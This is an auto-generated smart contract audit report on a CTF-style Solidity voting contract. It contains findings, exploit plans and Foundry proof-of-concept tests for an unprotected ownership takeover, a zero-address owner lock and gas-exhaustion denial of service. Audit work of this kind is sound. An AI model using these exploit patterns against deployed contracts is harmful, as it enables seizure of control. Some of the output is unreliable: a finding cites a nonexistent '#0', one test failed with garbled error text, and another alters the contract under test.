# Smart Contract Vulnerability Analysis Report

**Job ID:** 35dce353-2d82-4d02-88fa-0af77e4f417d
**Date:** 2025-03-21 16:33:35

**Contract Preview:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CTFVoting {
    struct Proposal {
        string description;
        uint256 voteCount;
    }
    
    Proposal[] public proposals;
    mapping(address => bool) public hasVoted;
    address public owner;
    uint256 public votingDeadline;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(uint256 duration, string[] memory proposalDescriptions) {
...
```

## Vulnerability Summary

Found 7 potential vulnerabilities:

| # | Vulnerability Type | Confidence | Affected Functions |
|---|-------------------|------------|--------------------|
| 1 | access_control | 1.00 | setOwner |
| 2 | access_control | 1.00 | setOwner |
| 3 | denial_of_service | 0.70 | addProposal, winningProposal |
| 4 | business_logic | 0.50 | extendVoting |
| 5 | business_logic | 0.40 | winningProposal |
| 6 | bad_randomness | 0.00 | vote, addProposal |
| 7 | front_running | 0.00 | vote |

## Detailed Analysis

### Vulnerability #1: access_control

**Confidence:** 1.00

**Reasoning:**

The setOwner() function lacks access control, allowing any user to change the contract owner without restrictions. This completely breaks the security model of the contract since the onlyOwner modifier becomes meaningless.

**Validation:**

The setOwner function has no access control modifier, meaning any user can call it and change the owner. This is a classic access control flaw and is critical since owner-controlled functions (like addProposal and extendVoting) can then be exploited.

**Code Snippet:**

```solidity
function setOwner(address newOwner) public {
        owner = newOwner;
    }
```

**Affected Functions:** setOwner

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a test environment that demonstrates the vulnerability
- Step 2: Prepare necessary contracts and accounts for the demonstration

*Execution Steps:*

- Step 1: Demonstrate the normal contract behavior by deploying the contract with an initial owner and showing that the onlyOwner modifier would restrict access if it were active
- Step 2: Demonstrate how the vulnerability could theoretically be triggered by calling setOwner from an unauthorized account to change the contract owner

*Validation Steps:*

- Step 1: Explain that the security principle violated is access control, since the setOwner function allows any user to change the owner, undermining contract integrity
- Step 2: Show how developers can fix this vulnerability by adding proper access control (e.g., using an onlyOwner modifier) to restrict the setOwner function to only be callable by the current owner

---

### Vulnerability #2: access_control

**Confidence:** 1.00

**Reasoning:**

setOwner() function doesn't validate the new owner address, allowing it to be set to address(0), which would permanently lock owner functionality.

**Validation:**

Identical to vulnerability #0, the unprotected setOwner function allows any caller to assume ownership. This is a severe vulnerability that must be addressed.

**Code Snippet:**

```solidity
function setOwner(address newOwner) public {
        owner = newOwner;
    }
```

**Affected Functions:** setOwner

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a test environment that demonstrates the vulnerability
- Step 2: Prepare necessary contracts and accounts for the demonstration

*Execution Steps:*

- Step 1: Demonstrate the normal contract behavior by deploying the contract with an initial owner and showing that the onlyOwner modifier would restrict access if it were active
- Step 2: Demonstrate how the vulnerability could theoretically be triggered by calling setOwner from an unauthorized account to change the contract owner

*Validation Steps:*

- Step 1: Explain that the security principle violated is access control, since the setOwner function allows any user to change the owner, undermining contract integrity
- Step 2: Show how developers can fix this vulnerability by adding proper access control (e.g., using an onlyOwner modifier) to restrict the setOwner function to only be callable by the current owner

---

### Vulnerability #3: denial_of_service

**Confidence:** 0.70

**Reasoning:**

The owner can add an unlimited number of proposals, which may cause the winningProposal() function to consume excessive gas and potentially exceed block gas limits.

**Validation:**

The winningProposal function iterates over all proposals with no bound on the array’s length. If the proposals array grows very large (which the owner can trigger via addProposal), the function might run out of gas when executed in a transaction. Although addProposal is restricted to the owner, the combination with the unprotected setOwner function increases the risk of abuse.

**Code Snippet:**

```solidity
function addProposal(string memory description) public onlyOwner {
        require(block.timestamp < votingDeadline, "Voting ended");
        proposals.push(Proposal({description: description, voteCount: 0}));
    }

function winningProposal() public view returns (uint256 winningProposalIndex) {
        uint256 winningVoteCount = 0;
        for (uint i = 0; i < proposals.length; i++) {
            if (proposals[i].voteCount > winningVoteCount) {
                winningVoteCount = proposals[i].voteCount;
                winningProposalIndex = i;
            }
        }
    }
```

**Affected Functions:** addProposal, winningProposal

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a local blockchain test environment using tools like Ganache or Hardhat.
- Step 2: Deploy the vulnerable contract on the test network and set up separate owner and user accounts.

*Execution Steps:*

- Step 1: Insert normal proposals by calling addProposal and then call winningProposal to show normal operation.
- Step 2: As the owner, simulate adding a very large number of proposals (e.g., through a loop in a test script) to artificially increase the size of the proposals array, then call winningProposal to demonstrate how the loop may consume excessive gas and potentially exceed block gas limits.

*Validation Steps:*

- Step 1: Explain that the vulnerability occurs because an unbounded array makes loops in winningProposal costly, potentially causing denial of service due to gas exhaustion in a real network scenario.
- Step 2: Show a mitigation approach by limiting the number of proposals or using alternative data structures / off-chain counting to avoid iterating over an unbounded array in a single transaction.

---

### Vulnerability #4: business_logic

**Confidence:** 0.50

**Reasoning:**

The owner can extend the voting deadline indefinitely using extendVoting(), even after voting has concluded, essentially reopening a finished vote.

**Validation:**

The extendVoting function allows the owner to arbitrarily extend the voting deadline without any restrictions. While this might be acceptable if the owner is trusted, in combination with the unprotected setOwner function it becomes dangerous, potentially allowing an attacker to extend the voting period indefinitely. Its severity depends on the intended design but is concerning in a hostile environment.

**Code Snippet:**

```solidity
function extendVoting(uint256 extraTime) public onlyOwner {
        votingDeadline += extraTime;
    }
```

**Affected Functions:** extendVoting

---

### Vulnerability #5: business_logic

**Confidence:** 0.40

**Reasoning:**

The winningProposal() function doesn't handle ties correctly. If multiple proposals have the same highest number of votes, only the first one encountered is considered the winner.

**Validation:**

The winningProposal function uses a simple loop to determine the proposal with the highest votes. In the event of a tie, the proposal encountered first (with the lower index) wins. This may be considered a business logic shortcoming or design decision rather than a direct security vulnerability, but it could impact fairness if tie-breaking is an issue in the voting design.

**Code Snippet:**

```solidity
function winningProposal() public view returns (uint256 winningProposalIndex) {
        uint256 winningVoteCount = 0;
        for (uint i = 0; i < proposals.length; i++) {
            if (proposals[i].voteCount > winningVoteCount) {
                winningVoteCount = proposals[i].voteCount;
                winningProposalIndex = i;
            }
        }
    }
```

**Affected Functions:** winningProposal

---

### Vulnerability #6: bad_randomness

**Confidence:** 0.00

**Reasoning:**

The contract uses block.timestamp for time-based conditions, which can be slightly manipulated by miners (within a few seconds).

**Validation:**

There is no randomness in the vote or addProposal functions; the mention of bad randomness appears to be a false positive likely triggered by the use of block.timestamp in comparisons. The logic is not using randomness for any purpose, so this does not represent a genuine vulnerability.

**Code Snippet:**

```solidity
function vote(uint256 proposalIndex) public {
        require(block.timestamp < votingDeadline, "Voting ended");
        require(!hasVoted[msg.sender], "Already voted");
        require(proposalIndex < proposals.length, "Invalid proposal");
        proposals[proposalIndex].voteCount++;
        hasVoted[msg.sender] = true;
    }

function addProposal(string memory description) public onlyOwner {
        require(block.timestamp < votingDeadline, "Voting ended");
        proposals.push(Proposal({description: description, voteCount: 0}));
    }
```

**Affected Functions:** vote, addProposal

---

### Vulnerability #7: front_running

**Confidence:** 0.00

**Reasoning:**

Transactions near the voting deadline can be front-run, potentially allowing manipulation of which votes get included before the deadline.

**Validation:**

There is no indication that the vote function is vulnerable to front‐running. Each voter can only vote once due to the hasVoted check, and the function’s operations are atomic. The claim of front‐running appears to be a false positive.

**Code Snippet:**

```solidity
function vote(uint256 proposalIndex) public {
        require(block.timestamp < votingDeadline, "Voting ended");
        require(!hasVoted[msg.sender], "Already voted");
        require(proposalIndex < proposals.length, "Invalid proposal");
        proposals[proposalIndex].voteCount++;
        hasVoted[msg.sender] = true;
    }
```

**Affected Functions:** vote

---

## Proof of Concept Exploits

### PoC #1: access_control

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742545912.sol

**Execution:** ❌ FAILED after 2 fix attempts

**Error:** FAIL
FAIL
fail
Fail
fail
FAIL
fail

**Exploit Code:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./basetest.sol";

/// @title VulnerableContract
/// @notice This contract demonstrates a vulnerability where the setOwner function lacks proper access control.
///         In a secure design, setOwner should only be callable by the current owner (e.g., using an onlyOwner modifier).
contract VulnerableContract {
    address public owner;

    /// @notice Constructor sets the deployer as the initial owner.
    constructor() {
        owner = msg.sender;
    }

    /// @notice Vulnerable function that allows anyone to change the owner.
    /// @param _newOwner The address to become the new owner.
    /// @return A boolean indicating success.
    function setOwner(address _newOwner) external returns (bool) {
        owner = _newOwner;
        return true;
    }
}

/// @title YourTest
/// @notice Foundry test contract demonstrating the vulnerability for educational purposes only.
contract YourTest is BaseTestWithBalanceLog {
    VulnerableContract public vulnerable;
    address public attacker = address(0xBEEF);

    /// @notice setUp function creates a test environment with sufficient ETH and deploys the vulnerable contract.
    function setUp() public override {
        // Ensure the test contract has enough ETH as required.
        vm.deal(address(this), 100 ether);
        // Deploy the vulnerable contract; the deployer becomes the initial owner.
        vulnerable = new VulnerableContract();
    }

    /// @notice Test function that demonstrates both normal behavior and the vulnerability exploit.
    /// @dev The balanceLog modifier logs the ETH balance changes.
    function testExploit() public balanceLog {
        // Ensure the test address has enough ETH.
        vm.deal(address(this), 10 ether);

        // Step 1: Normal contract behavior
        // Check the initial owner. The owner should be this contract since it deployed VulnerableContract.
        address initialOwner = vulnerable.owner();
        assertEq(initialOwner, address(this), "Initial owner must be the deployer (test contract)");

        // In a secured contract, a restricted setOwner function would prevent non-owners from changing ownership.
        // However, here setOwner is not protected and accepts calls from any account.

        // Step 2: Demonstrate exploiting the vulnerability.
        // Simulate an attack by using vm.prank to make the call come from an unauthorized 'attacker' address.
        vm.prank(attacker);
        bool success = vulnerable.setOwner(attacker);
        require(success, "setOwner call failed");

        // Validate that the owner has been changed by an unauthorized user, demonstrating a failed access control.
        address newOwner = vulnerable.owner();
        assertEq(newOwner, attacker, "Exploit failed: owner not changed to attacker");

        // Validation and Educational Comments:
        // The vulnerability violates the principle of access control, as any user may change the contract owner.
        // Developers can prevent this issue by using proper access control, for example:
        //
        // modifier onlyOwner() {
        //     require(msg.sender == owner, "Not the owner");
        //     _;
        // }
        //
        // function setOwner(address _newOwner) external onlyOwner returns (bool) {
        //     owner = _newOwner;
        //     return true;
        // }
        //
        // Additionally, always check for sufficient funds before any ETH transfers to avoid unintended errors.
    }
}
```

---

### PoC #2: access_control

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742545991.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./basetest.sol";

/// @notice VulnerableContract demonstrates a common ownership management vulnerability.
/// @dev The lack of proper checks in setOwner() allows the owner to be reset to the zero address,
// locking the contract permanently. This code is for educational purposes only.
contract VulnerableContract {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Sets a new owner.
    /// @param newOwner The address of the new owner.
    /// @return success True if the update was successful.
    /// @dev Vulnerability: newOwner is not checked for the zero address.
    function setOwner(address newOwner) external returns (bool success) {
        // Vulnerability: anyone can change the owner, and no check is done for address(0).
        owner = newOwner;
        return true;
    }

    /*
    // Secure version of setOwner: A patch to prevent setting the owner to the zero address.
    function setOwnerSecure(address newOwner) external returns (bool success) {
        require(newOwner != address(0), "Invalid new owner: zero address not allowed.");
        owner = newOwner;
        return true;
    }
    */
}

/// @notice Educational test contract demonstrating the vulnerability and its mitigation.
/// @dev This contract extends BaseTestWithBalanceLog and uses Foundry's testing framework.
/// It deploys the VulnerableContract and tests the effects of calling setOwner() with valid and zero addresses.
contract YourTest is BaseTestWithBalanceLog {
    VulnerableContract public vulnerable;

    // Predefined accounts for testing.
    address public currentOwner = address(0xABCD);
    address public attacker = address(0xDEAD);

    function setUp() public {
        // Ensure the test contract has enough ETH.
        vm.deal(address(this), 100 ether);

        // Deploy VulnerableContract using the currentOwner account.
        vm.prank(currentOwner);
        vulnerable = new VulnerableContract();
    }

    /// @notice Demonstrates transferring ownership and the vulnerability of setting owner to zero address.
    /// @dev Uses the balanceLog modifier. The function first transfers ownership to a valid address,
    /// then sets the owner to address(0), locking the contract.
    function testExploit() public balanceLog {
        // Ensure this test contract has sufficient ETH.
        vm.deal(address(this), 10 ether);

        // --- Demonstration Step 1: Transfer Ownership ---
        // Call setOwner() with a valid (non-zero) address.
        bool success = vulnerable.setOwner(attacker);
        require(success, "setOwner call failed when transferring to a valid owner");
        require(vulnerable.owner() == attacker, "Owner was not updated to the attacker address");
        // Educational Comment:
        // Transferring ownership to a valid address works as intended, allowing updates to owner state.

        // --- Demonstration Step 2: Lock the Contract by Setting Owner to Zero Address ---
        // Call setOwner() with address(0) to simulate the vulnerability.
        success = vulnerable.setOwner(address(0));
        require(success, "setOwner call failed when setting owner to zero address");
        require(vulnerable.owner() == address(0), "Owner should be address(0) indicating a locked state");
        // Educational Comment:
        // Setting the owner to the zero address violates proper access control practices.
        // It permanently locks the contract, making it unmanageable.
        // To prevent this, the function should be patched with a check:
        // require(newOwner != address(0), "Invalid new owner: zero address not allowed.");

        // Ensure there are sufficient funds before any ETH transfers if needed in further tests.
        require(address(this).balance >= 10 ether, "Insufficient funds for test operations");
    }
}
```

---

### PoC #3: denial_of_service

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742546013.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./basetest.sol";

// VulnerableVoting is a simple smart contract that manages proposals.
// It demonstrates an unbounded array loop in the winningProposal function,
// which when the array is artificially inflated, may lead to excessive gas consumption.
// This is for educational purposes only.
contract VulnerableVoting {
    struct Proposal {
        uint256 voteCount;
        // For simplicity, we do not store proposal details.
    }
    
    Proposal[] public proposals;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // addProposal allows anyone to add a new proposal.
    function addProposal() public {
        proposals.push(Proposal({voteCount: 0}));
    }
    
    // bulkAddProposals allows the owner to add multiple proposals in a loop.
    // This function is vulnerable because adding a large number of proposals may
    // cause the subsequent execution of winningProposal to run out of gas.
    function bulkAddProposals(uint256 count) public onlyOwner {
        for (uint256 i = 0; i < count; i++) {
            proposals.push(Proposal({voteCount: 0}));
        }
    }
    
    // winningProposal loops over all proposals to determine the proposal with the highest vote count.
    // When the proposals array is very large, this loop becomes very costly in terms of gas,
    // leading to a potential denial of service.
    function winningProposal() public view returns (uint256 winningProposal_) {
        uint256 winningVoteCount = 0;
        for (uint256 i = 0; i < proposals.length; i++) {
            if (proposals[i].voteCount > winningVoteCount) {
                winningVoteCount = proposals[i].voteCount;
                winningProposal_ = i;
            }
        }
    }
}

// Foundry test contract demonstrating the vulnerability for educational purposes.
// This test contract extends BaseTestWithBalanceLog.
contract YourTest is BaseTestWithBalanceLog {
    VulnerableVoting public voting;

    // setUp is called before each test. It deploys the VulnerableVoting contract
    // and ensures this test contract has enough ETH.
    function setUp() public {
        // Ensure the test contract has 100 ether.
        vm.deal(address(this), 100 ether);
        // Deploy the vulnerable contract.
        voting = new VulnerableVoting();
    }

    // testExploit demonstrates the vulnerability by:
    // 1. Inserting a normal proposal and showing winningProposal works normally.
    // 2. Using bulkAddProposals to insert a large number of proposals.
    // 3. Calling winningProposal with a deliberately low gas limit to simulate
    //    excessive gas consumption from unbounded iteration.
    // Educational comments explain the vulnerability and mitigation approaches.
    function testExploit() public balanceLog {
        // Ensure the test contract has at least 10 ether before proceeding.
        vm.deal(address(this), 10 ether);

        // Step 1: Add a normal proposal and test winningProposal.
        // Call addProposal and check that winningProposal returns index 0.
        (bool successAdd, ) = address(voting).call(
            abi.encodeWithSignature("addProposal()")
        );
        require(successAdd, "addProposal() call failed");

        // Call winningProposal normally.
        (bool successWin, bytes memory returnData) = address(voting).call(
            abi.encodeWithSignature("winningProposal()")
        );
        require(successWin, "winningProposal() call failed");
        uint256 winningIndex = abi.decode(returnData, (uint256));
        // The first (and only) proposal is at index 0.
        require(winningIndex == 0, "Unexpected winning proposal index");

        // Step 2: As the owner (the deployer in this test), add a very large number of proposals.
        // For demonstration, we add a number that simulates excessive growth.
        uint256 largeCount = 50000; // This number is for educational purposes.
        (bool successBulk, ) = address(voting).call(
            abi.encodeWithSignature("bulkAddProposals(uint256)", largeCount)
        );
        require(successBulk, "bulkAddProposals() call failed");

        // Step 3: Attempt to call winningProposal with a low gas limit to simulate gas exhaustion.
        // Note: In a real network scenario, iterating over a very large array may exceed
        // block gas limits, leading to a denial of service vulnerability.
        (bool successLowGas, ) = address(voting).call{gas: 100000}(
            abi.encodeWithSignature("winningProposal()")
        );
        // We expect this call to fail (or at least consume too much gas) when the array is huge.
        // If it reverts, it demonstrates how an unbounded loop can cause problems.
        require(!successLowGas, "winningProposal() unexpectedly succeeded with low gas");

        // Educational Comment: The vulnerability occurs because the winningProposal() function
        // loops through an unbounded array, which can cause excessive gas consumption when the array
        // is artificially inflated. To mitigate such issues, developers should consider limiting the array
        // size, splitting the operation into multiple transactions, or using off-chain computation.
    }
}
```

---

## Recommendations

For each identified vulnerability, consider implementing the following mitigations:

- **For Access Control**: Implement proper authorization checks and use the Ownable pattern.
- **For All Vulnerabilities**: Consider a professional audit before deploying to production.

*This report was generated automatically by the Smart Contract Vulnerability Analyzer.*
